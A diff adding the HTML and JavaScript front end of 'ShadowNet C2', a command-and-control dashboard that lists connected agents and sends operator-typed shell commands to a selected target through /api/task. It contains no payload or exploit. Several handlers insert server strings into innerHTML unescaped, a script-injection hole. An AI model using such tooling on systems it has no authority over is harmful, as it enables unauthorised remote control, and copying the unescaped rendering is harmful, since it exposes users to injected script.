@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ShadowNet Dashboard</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='modern-theme.css') }}">
+    <script src="{{ url_for('static', filename='theme.js') }}"></script>
+</head>
+
+<body class="theme-dark">
+
+<div class="container-fluid mt-4">
+
+    <!-- Header with User Info -->
+    <div class="row mb-4">
+        <div class="col">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h2 class="mb-0"><i class="fas fa-terminal text-primary"></i> ShadowNet C2</h2>
+                    <small class="text-muted">Command & Control Dashboard</small>
+                </div>
+                <div class="d-flex align-items-center gap-3">
+                    <div class="text-muted">
+                        <i class="fas fa-user-circle"></i>
+                        <span class="ms-1"><strong class="text-info">{{ username }}</strong></span>
+                    </div>
+                    <button class="btn btn-outline-info btn-sm" data-bs-toggle="modal" data-bs-target="#settingsModal">
+                        <i class="fas fa-key"></i> Change Password
+                    </button>
+                    {% if user_role == 'admin' or user_role == 'developer' %}
+                    <a href="/admin-panel" class="btn btn-outline-secondary btn-sm">
+                        <i class="fas fa-shield-alt"></i> Admin Panel
+                    </a>
+                    {% endif %}
+                    <button id="logoutBtn" class="btn btn-outline-danger btn-sm">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Flash Messages -->
+    {% with messages = get_flashed_messages(with_categories=True) %}
+        {% if messages %}
+            {% for category, message in messages %}
+            <div class="alert alert-{{ category }} alert-dismissible fade show" role="alert">
+                {{ message }}
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            {% endfor %}
+        {% endif %}
+    {% endwith %}
+
+    <!-- Stats Overview -->
+    <div class="row mb-4">
+        <div class="col-md-3">
+            <div class="card stats-card h-100">
+                <div class="card-body d-flex align-items-center">
+                    <div class="stat-icon text-success me-3">
+                        <i class="fas fa-laptop"></i>
+                    </div>
+                    <div>
+                        <div class="text-muted small">Active Agents</div>
+                        <div class="h3 mb-0" id="activeAgentsCount">0</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card stats-card h-100">
+                <div class="card-body d-flex align-items-center">
+                    <div class="stat-icon text-warning me-3">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div>
+                        <div class="text-muted small">Open Incidents</div>
+                        <div class="h3 mb-0" id="openIncidentsCount">0</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card stats-card h-100">
+                <div class="card-body d-flex align-items-center">
+                    <div class="stat-icon text-info me-3">
+                        <i class="fas fa-tasks"></i>
+                    </div>
+                    <div>
+                        <div class="text-muted small">Tasks Executed</div>
+                        <div class="h3 mb-0" id="tasksExecutedCount">0</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card stats-card h-100">
+                <div class="card-body d-flex align-items-center">
+                    <div class="stat-icon text-danger me-3">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div>
+                        <div class="text-muted small">High Risk Agents</div>
+                        <div class="h3 mb-0" id="highRiskCount">0</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- Left Side - Command & Control Center -->
+        <div class="col-lg-5">
+            <!-- Command Execution Panel -->
+            <div class="card agent-selector-card mb-4">
+                <div class="card-body">
+                    <h5 class="section-header">
+                        <i class="fas fa-terminal"></i> Command Execution
+                    </h5>
+                    
+                    <!-- Agent Selector -->
+                    <div class="mb-3">
+                        <label class="form-label fw-bold">
+                            <i class="fas fa-crosshairs"></i> Target Agent:
+                        </label>
+                        <select id="agentSelect" class="form-select bg-dark text-light border-secondary">
+                            <option value="">-- Select Target Agent --</option>
+                        </select>
+                    </div>
+                    
+                    <!-- Command Input with Icon -->
+                    <div class="mb-3">
+                        <label class="form-label fw-bold">
+                            <i class="fas fa-code"></i> Command:
+                        </label>
+                        <div class="input-group">
+                            <span class="input-group-text bg-dark text-success border-secondary">
+                                <i class="fas fa-dollar-sign"></i>
+                            </span>
+                            <input type="text" 
+                                   id="commandInput" 
+                                   class="form-control bg-dark text-light border-secondary" 
+                                   placeholder="Type command here (e.g., whoami, pwd, ls -la)"
+                                   disabled>
+                        </div>
+                        <small class="text-muted mt-1 d-block">
+                            <i class="fas fa-info-circle"></i> Press Enter or click Execute to send command
+                        </small>
+                    </div>
+                    
+                    <button id="executeBtn" class="btn btn-primary w-100" disabled>
+                        <i class="fas fa-paper-plane"></i> Execute Command
+                    </button>
+                </div>
+            </div>
+
+            <!-- Quick Commands Library -->
+            <div class="card bg-secondary mb-4">
+                <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <h6 class="mb-0">
+                            <i class="fas fa-star text-warning"></i> Quick Commands
+                        </h6>
+                        <a href="/commands" class="btn btn-outline-light btn-sm">
+                            <i class="fas fa-book"></i> Library
+                        </a>
+                    </div>
+                    
+                    <div id="quickCommands" class="quick-command-grid">
+                        <div class="text-center text-muted py-3">
+                            <small><i class="fas fa-spinner fa-spin"></i> Loading...</small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Status & History -->
+            <div class="card bg-secondary">
+                <div class="card-body">
+                    <h6 class="mb-3">
+                        <i class="fas fa-history"></i> Command Status
+                    </h6>
+                    <div id="commandStatus" class="command-terminal">
+                        <div class="text-muted text-center py-3">
+                            <i class="fas fa-terminal"></i> No commands executed yet
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Side - Agents & Incidents -->
+        <div class="col-lg-7">
+            <!-- Agents Table -->
+            <div class="card bg-secondary mb-4">
+                <div class="card-body">
+                    <h5 class="section-header">
+                        <i class="fas fa-network-wired"></i> Connected Agents
+                    </h5>
+                    <div class="table-responsive">
+                        <table class="table table-dark table-hover mt-3" id="agentsTable">
+                            <thead>
+                                <tr>
+                                    <th><i class="fas fa-tag"></i> Agent ID</th>
+                                    <th><i class="fas fa-signal"></i> Status</th>
+                                    <th><i class="fas fa-exclamation-triangle"></i> Risk</th>
+                                    <th><i class="fas fa-clock"></i> Last Seen</th>
+                                    <th><i class="fas fa-tasks"></i> Last Task</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td colspan="5" class="text-center text-muted">
+                                        <i class="fas fa-spinner fa-spin"></i> Loading agents...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Incidents Table -->
+            <div class="card bg-secondary">
+                <div class="card-body">
+                    <h5 class="section-header">
+                        <i class="fas fa-bell"></i> Security Incidents
+                    </h5>
+                    <div class="table-responsive">
+                        <table class="table table-dark table-hover mt-3" id="incidentsTable">
+                            <thead>
+                                <tr>
+                                    <th><i class="fas fa-laptop"></i> Agent</th>
+                                    <th><i class="fas fa-file-alt"></i> Type</th>
+                                    <th><i class="fas fa-exclamation-circle"></i> Severity</th>
+                                    <th><i class="fas fa-flag"></i> Status</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td colspan="4" class="text-center text-muted">
+                                        <i class="fas fa-spinner fa-spin"></i> Loading incidents...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<!-- Settings Modal -->
+<div class="modal fade" id="settingsModal" tabindex="-1" aria-labelledby="settingsModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary">
+                <h5 class="modal-title" id="settingsModalLabel">⚙️ Account Settings</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <h6 class="mb-3">Change Password</h6>
+                <div class="mb-3">
+                    <label for="currentPassword" class="form-label">Current Password</label>
+                    <input type="password" class="form-control bg-secondary text-light border-0" id="currentPassword" placeholder="Enter current password">
+                </div>
+                <div class="mb-3">
+                    <label for="newPassword" class="form-label">New Password</label>
+                    <input type="password" class="form-control bg-secondary text-light border-0" id="newPassword" placeholder="Enter new password">
+                </div>
+                <div class="mb-3">
+                    <label for="confirmPassword" class="form-label">Confirm New Password</label>
+                    <input type="password" class="form-control bg-secondary text-light border-0" id="confirmPassword" placeholder="Confirm new password">
+                </div>
+                <div id="passwordChangeMessage" class="alert d-none" role="alert"></div>
+            </div>
+            <div class="modal-footer border-secondary">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" id="changePasswordBtn">Change Password</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script src="{{ url_for('static', filename='app.js') }}"></script>
+
+<script>
+// =========================
+// Command Panel Logic
+// =========================
+
+let selectedAgent = null;
+let commandHistory = [];
+
+// Load favorite commands
+async function loadFavoriteCommands() {
+    try {
+        const response = await fetch('/api/commands/favorites');
+        const commands = await response.json();
+        
+        const container = document.getElementById('quickCommands');
+        
+        if (commands.length === 0) {
+            container.innerHTML = '<div class="text-center text-muted py-2"><small><i class="fas fa-info-circle"></i> No favorite commands</small></div>';
+            return;
+        }
+        
+        container.innerHTML = '';
+        commands.forEach(cmd => {
+            const btn = document.createElement('button');
+            btn.className = 'quick-cmd-btn';
+            btn.innerHTML = `<i class="fas fa-terminal"></i> ${cmd.name}`;
+            btn.title = cmd.description;
+            btn.dataset.command = cmd.command;
+            btn.dataset.templateId = cmd.id;
+            
+            btn.addEventListener('click', () => {
+                document.getElementById('commandInput').value = cmd.command;
+                document.getElementById('commandInput').dataset.templateId = cmd.id;
+            });
+            
+            container.appendChild(btn);
+        });
+    } catch (error) {
+        console.error('[ERROR] Loading favorite commands:', error);
+        document.getElementById('quickCommands').innerHTML = 
+            '<div class="text-danger text-center py-2"><small><i class="fas fa-times"></i> Error loading commands</small></div>';
+    }
+}
+
+// Populate agent selector
+async function populateAgentSelector() {
+    try {
+        const response = await fetch('/agents');
+        const agents = await response.json();
+        
+        const select = document.getElementById('agentSelect');
+        const currentValue = select.value;
+        select.innerHTML = '<option value="">-- Select Target Agent --</option>';
+        
+        agents.forEach(agent => {
+            const option = document.createElement('option');
+            option.value = agent.alias;
+            const statusIcon = (agent.status === 'alive' || agent.status === 'online') ? '🟢' : '🔴';
+            option.textContent = `${statusIcon} ${agent.alias} (${agent.status})`;
+            option.disabled = agent.status !== 'alive' && agent.status !== 'online';
+            select.appendChild(option);
+        });
+        
+        if (currentValue) {
+            select.value = currentValue;
+        }
+    } catch (error) {
+        console.error('[ERROR] Loading agents:', error);
+    }
+}
+
+// Agent selection handler
+document.getElementById('agentSelect').addEventListener('change', function() {
+    selectedAgent = this.value;
+    const commandInput = document.getElementById('commandInput');
+    const executeBtn = document.getElementById('executeBtn');
+    
+    if (selectedAgent) {
+        commandInput.disabled = false;
+        executeBtn.disabled = false;
+        commandInput.focus();
+    } else {
+        commandInput.disabled = true;
+        executeBtn.disabled = true;
+    }
+});
+
+// Update command status display
+function updateCommandStatus(type, agent, command, message) {
+    const statusDiv = document.getElementById('commandStatus');
+    const timestamp = new Date().toLocaleTimeString();
+    
+    const icon = type === 'success' ? 'check-circle' : type === 'error' ? 'times-circle' : 'info-circle';
+    const color = type === 'success' ? 'success' : type === 'error' ? 'danger' : 'info';
+    
+    const historyItem = `
+        <div class="command-history-item border-${color}">
+            <div class="d-flex justify-content-between align-items-start mb-2">
+                <div>
+                    <i class="fas fa-${icon} text-${color}"></i>
+                    <span class="text-light fw-bold">${agent}</span>
+                    <small class="text-muted ms-2">${timestamp}</small>
+                </div>
+            </div>
+            <div class="text-info">
+                <i class="fas fa-terminal"></i> ${command}
+            </div>
+            ${message ? `<div class="command-output">${message}</div>` : ''}
+        </div>
+    `;
+    
+    commandHistory.unshift(historyItem);
+    if (commandHistory.length > 5) commandHistory.pop();
+    
+    statusDiv.innerHTML = commandHistory.join('');
+}
+
+// Execute command
+document.getElementById('executeBtn').addEventListener('click', async function() {
+    const command = document.getElementById('commandInput').value.trim();
+    const templateId = document.getElementById('commandInput').dataset.templateId || null;
+    
+    if (!selectedAgent) {
+        alert('⚠️ Please select an agent first');
+        return;
+    }
+    
+    if (!command) {
+        alert('⚠️ Please enter a command');
+        return;
+    }
+    
+    updateCommandStatus('info', selectedAgent, command, 'Sending command...');
+    
+    try {
+        const response = await fetch('/api/task', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                agent_alias: selectedAgent,
+                command: command,
+                template_id: templateId
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (response.ok) {
+            updateCommandStatus('success', selectedAgent, command, '✓ Command sent successfully');
+            
+            // Clear command input
+            document.getElementById('commandInput').value = '';
+            delete document.getElementById('commandInput').dataset.templateId;
+            
+            // Refresh agents table
+            loadAgents();
+        } else {
+            throw new Error(result.error || 'Command failed');
+        }
+    } catch (error) {
+        updateCommandStatus('error', selectedAgent, command, `✗ Error: ${error.message}`);
+    }
+});
+
+// Allow Enter key to execute
+document.getElementById('commandInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter' && !this.disabled) {
+        document.getElementById('executeBtn').click();
+    }
+});
+
+// Initialize on load
+document.addEventListener("DOMContentLoaded", () => {
+    loadFavoriteCommands();
+    populateAgentSelector();
+    
+    // Refresh agent selector periodically
+    setInterval(populateAgentSelector, 10000);
+});
+
+// Logout handler
+document.getElementById('logoutBtn').addEventListener('click', async function() {
+    if (confirm('Are you sure you want to logout?')) {
+        try {
+            await fetch('/logout', { method: 'POST' });
+            window.location.href = '/login';
+        } catch (error) {
+            console.error('Logout error:', error);
+            window.location.href = '/login';
+        }
+    }
+});
+
+// Password change handler
+document.getElementById('changePasswordBtn').addEventListener('click', async function() {
+    const currentPassword = document.getElementById('currentPassword').value;
+    const newPassword = document.getElementById('newPassword').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
+    const messageDiv = document.getElementById('passwordChangeMessage');
+    
+    // Reset message
+    messageDiv.classList.add('d-none');
+    messageDiv.classList.remove('alert-success', 'alert-danger');
+    
+    // Validation
+    if (!currentPassword || !newPassword || !confirmPassword) {
+        messageDiv.textContent = 'Please fill in all fields';
+        messageDiv.classList.remove('d-none');
+        messageDiv.classList.add('alert-danger');
+        return;
+    }
+    
+    if (newPassword !== confirmPassword) {
+        messageDiv.textContent = 'New passwords do not match';
+        messageDiv.classList.remove('d-none');
+        messageDiv.classList.add('alert-danger');
+        return;
+    }
+    
+    if (newPassword.length < 6) {
+        messageDiv.textContent = 'New password must be at least 6 characters';
+        messageDiv.classList.remove('d-none');
+        messageDiv.classList.add('alert-danger');
+        return;
+    }
+    
+    try {
+        const response = await fetch('/api/change-password', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                current_password: currentPassword,
+                new_password: newPassword
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (response.ok) {
+            messageDiv.textContent = '✓ Password changed successfully!';
+            messageDiv.classList.remove('d-none');
+            messageDiv.classList.add('alert-success');
+            
+            // Clear fields
+            document.getElementById('currentPassword').value = '';
+            document.getElementById('newPassword').value = '';
+            document.getElementById('confirmPassword').value = '';
+            
+            // Close modal after 2 seconds
+            setTimeout(() => {
+                bootstrap.Modal.getInstance(document.getElementById('settingsModal')).hide();
+            }, 2000);
+        } else {
+            messageDiv.textContent = '✗ ' + (result.error || 'Failed to change password');
+            messageDiv.classList.remove('d-none');
+            messageDiv.classList.add('alert-danger');
+        }
+    } catch (error) {
+        messageDiv.textContent = '✗ Error: ' + error.message;
+        messageDiv.classList.remove('d-none');
+        messageDiv.classList.add('alert-danger');
+    }
+});
+</script>
+
+</body>
+</html>
